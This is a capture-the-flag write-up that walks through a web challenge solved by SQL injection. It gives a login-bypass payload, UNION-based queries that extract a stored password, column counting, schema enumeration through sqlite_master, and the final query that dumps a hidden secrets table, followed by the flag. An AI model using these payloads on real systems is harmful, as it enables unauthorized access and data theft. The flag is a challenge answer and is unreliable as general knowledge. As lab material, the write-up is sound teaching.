## Solution

This challenge was pretty similar to the one I solved during the citadel ctf, a bit evolved yes, but still almost the same. Our first task was to get through the `Access Portal`, which just required a simple SQL injection `'OR 1=1--`.
<img width="555" height="541" alt="image" src="https://github.com/user-attachments/assets/4dddc903-bb4d-4e0b-8295-5e4deb99bd8c" />

After getting through it, we were tasked to find someone from management has the password.

<img width="1850" height="676" alt="image" src="https://github.com/user-attachments/assets/8a299bd7-9922-4154-af7a-57e83315408d" />

The Search bar, could be easily manipulated to search through `UNION Based Injections`, So I made a union based injection filling it with all the column names, and then trying common table names to filter all Management users to get the password.
```SQL
' UNION SELECT id, name, department, email, notes FROM employees WHERE department='Management'-- 
```
<img width="1896" height="683" alt="image" src="https://github.com/user-attachments/assets/152fec79-8d81-45a9-96e5-deece74c239b" />

So now I know that Someone named `Kiwi` in the `Management` department has the password, so I edit the query to also look for Kiwi with Management role.

```SQL
' UNION SELECT id, name, department, email, notes FROM employees WHERE department='Management' AND name='Kiwi'-- 
```

<img width="1914" height="545" alt="image" src="https://github.com/user-attachments/assets/235d7bb5-49ad-4aaf-8ce7-d34bdfdc3380" />

Finally Found the password.

Now Entering it in the Passcode textbox, I was redirected to the admin page.

<img width="1870" height="846" alt="image" src="https://github.com/user-attachments/assets/a30e4184-1aae-44b1-9d3f-de827c934c24" />

The admin console seemed a bit tricky, first i thought i'd find the flag in `REDACTED` table, but I couldn't figure out how to get into it, so i tried something else, I tried to figure out how many columns the table as so That I can base my Query Search, to do that I just did,

```SQL
' UNION SELECT NULL,NULL,NULL,NULL--
```
I tried adding and removing `NULL` till i didn't get an error, So now i know there are 4 Columns, another thing i found out using this was Which type of Database was it using, which was SQLite, if found this out by seeing the error message :
```
SQL error: no such column: last_update
```
this is a classic SQLite Error, so from there i searched online to find the command which would print all the tables, which is where i found `sqlite_master`, so i used the following command,
```
' UNION SELECT 1, name, type, sql FROM sqlite_master WHERE type='table'--
```
Let's Breakdown this Command : 
`sqlite_master` : The sqlite_master table is a special internal table in SQLite that stores information about the database schema, including tables, indexes, views, and triggers.
Now Why did We Take those Values for SELECT, we know that it needs 4 columns to work, which are `ID`,`quarter`,`note` and `revenue`, but we also need to print all the names of the table and tables, so what we do is
```
ID : 1 # Could be any random Value, and is just a placeholder
Quarter : name # We put name here because we need all the names of the tables
Note : type # We Put type because we need to get only the tables when calling using sqlite_master
Revenue : sql # This prints the CREATE TABLE statements, which tell us the column names, hidden tables etc.
```
So what did this get us, it got us all the tables there and the names and CREATE TABLE statements : 

<img width="1863" height="847" alt="image" src="https://github.com/user-attachments/assets/105d6261-b183-4f2e-809a-798642e561a8" />

So here we can see that there is a table named `CITADEL_ARCHIVE_2077` and it has 1 column `secrets` which stores some text which probably is the flag. So how do we get it, the problem with just directly getting it is that our admin panel only allows us to display data with 4 columns, so what we can do is force it to reveal the flag by using the following command : 
```
' UNION SELECT 1, 2, 3, secrets FROM CITADEL_ARCHIVE_2077--
```
so what it does is it passes dummy values 1,2,3 respectively to the first 3 columns ID,Quarter and Note and in the fourth column rows it displays the Text from Secrets from the `CITADEL_ARCHIVE_2077` table, and that gets us our flag.

<img width="1848" height="522" alt="image" src="https://github.com/user-attachments/assets/658164ee-100d-4a9c-8088-18e5896cc130" />

## Flag : 
```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```
